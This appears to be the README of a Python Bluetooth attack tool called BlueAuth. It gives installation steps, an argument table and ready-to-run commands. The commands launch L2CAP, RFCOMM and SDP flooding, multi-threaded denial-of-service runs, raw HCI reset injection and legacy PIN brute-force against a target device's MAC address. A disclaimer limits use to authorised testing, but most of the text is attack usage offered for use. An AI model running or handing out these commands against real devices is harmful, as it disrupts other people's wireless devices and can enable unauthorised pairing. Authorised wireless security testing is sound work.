# 🔷 Bluetooth Deauth & Stress Testing Tool

> [!WARNING]
> **Legal Disclaimer**: This tool is designed strictly for authorized security auditing, penetration testing, and educational research on devices you own or have explicit written permission to test. Unauthorized disruption or denial-of-service against wireless devices is illegal under various national and international computer fraud laws.

---

## 📋 Features

- 🔍 **Classic Bluetooth Discovery**: Scan and identify nearby Bluetooth Classic devices, names, and device classes.
- 📡 **Bluetooth Low Energy (BLE) Scan**: Asynchronous discovery of BLE peripherals and beacon advertisements using `bleak`.
- 💥 **L2CAP Connection Flooding**: Multi-threaded packet burst to overwhelm target Logical Link Control and Adaptation Protocol layers.
- 📻 **RFCOMM Channel Flooding**: Stress-test RFCOMM serial channels (1–30) with connection requests and malformed AT noise.
- 🔎 **SDP Discovery Overload**: Flood targets with rapid Service Discovery Protocol queries.
- ⚡ **HCI Reset Commands**: Direct raw HCI command injection to trigger controller reset cycles on supported hardware.
- 🔑 **PIN Bruteforce (Legacy)**: Automated PIN pairing attempt testing against legacy Bluetooth PIN implementations.
- 🌪️ **Multi-Vector Attack Mode**: Concurrent execution of L2CAP, RFCOMM, and SDP attack vectors across scalable worker threads.
- 📊 **Real-time Statistics**: Detailed tracking of duration, requests sent, and throughput (requests/second).

---

## 🔧 Installation & Requirements

### 1. Clone & Install Python Dependencies

```bash
git clone https://github.com/amarkant3694/BlueAuth.git
cd BlueAuth

# Install Python requirements
pip install -r requirements.txt
```

### 2. Linux (Debian / Ubuntu / Kali) System Setup

Bluetooth Classic sockets and raw HCI functions require BlueZ development libraries and root privileges:

```bash
# Install BlueZ development packages
sudo apt-get update
sudo apt-get install -y libbluetooth-dev bluez

# Enable and start Bluetooth services
sudo systemctl enable --now bluetooth
sudo hciconfig hci0 up
```

### 3. Windows / macOS Notes
- **BLE scanning** (`--scan-ble`) works natively via `bleak`.
- **Bluetooth Classic socket attacks** (L2CAP, RFCOMM, HCI raw) require Linux with BlueZ support (`PyBluez`).

---

## 🚀 Usage Examples

### 🔍 Device Discovery

```bash
# Scan for Bluetooth Classic devices (10s default)
sudo python3 deauth.py --scan

# Scan for Bluetooth Low Energy (BLE) devices
python3 deauth.py --scan-ble -d 15
```

---

### ⚔️ Attack & Stress Testing Modes

```bash
# Multi-vector attack (L2CAP + RFCOMM + SDP) for 2 minutes with 5 worker threads
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --multi -d 120 --threads 5

# L2CAP flooding attack on PSM port 1 for 60 seconds
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --l2cap -p 1 -d 60

# RFCOMM channel flooding across channels 1-30 with 10 threads
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --rfcomm --threads 10 -d 60

# Target a specific RFCOMM channel (e.g., channel 1)
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --rfcomm -c 1 -d 30

# SDP service discovery overload attack
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --sdp -d 60

# Raw HCI controller reset command
sudo python3 deauth.py -i hci0 --hci-reset

# Legacy PIN bruteforce test
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --pin

# Verbose output mode with statistics
sudo python3 deauth.py -t AA:BB:CC:DD:EE:FF --multi -d 60 -v
```

---

## ⚙️ Command-Line Arguments Reference

| Argument | Short | Description | Default |
| :--- | :--- | :--- | :--- |
| `--target` | `-t` | Target device MAC address (`XX:XX:XX:XX:XX:XX`) | None |
| `--interface` | `-i` | Local Bluetooth interface | `hci0` |
| `--scan` | | Scan for Bluetooth Classic devices | `False` |
| `--scan-ble` | | Scan for BLE devices | `False` |
| `--multi` | | Multi-vector attack (L2CAP + RFCOMM + SDP) | `False` |
| `--l2cap` | | L2CAP flood attack vector | `False` |
| `--rfcomm` | | RFCOMM flood attack vector | `False` |
| `--sdp` | | SDP query overload attack vector | `False` |
| `--hci-reset` | | Send raw HCI reset packet | `False` |
| `--pin` | | PIN bruteforce legacy devices | `False` |
| `--port` | `-p` | L2CAP PSM port | `1` |
| `--channel` | `-c` | RFCOMM channel (1–30) | `None` (all) |
| `--duration` | `-d` | Duration in seconds (`0` for continuous) | `60` |
| `--count` | | Maximum number of packets/queries to send | `0` (unlimited) |
| `--threads` | | Number of worker threads per vector | `5` |
| `--verbose` | `-v` | Enable detailed diagnostic output | `False` |
| `--help` | `-h` | Show help and usage guide | |

---

## 🛡️ Troubleshooting

1. **`SyntaxError` or import issues:** Ensure Python 3.8+ is used and dependencies are installed via `pip install -r requirements.txt`.
2. **`Permission Denied` / `Operation not permitted`:** Raw Bluetooth socket operations require root permissions on Linux (`sudo`).
3. **`Device or resource busy`:** Reset the local adapter using `sudo hciconfig hci0 reset` or restart the Bluetooth daemon: `sudo systemctl restart bluetooth`.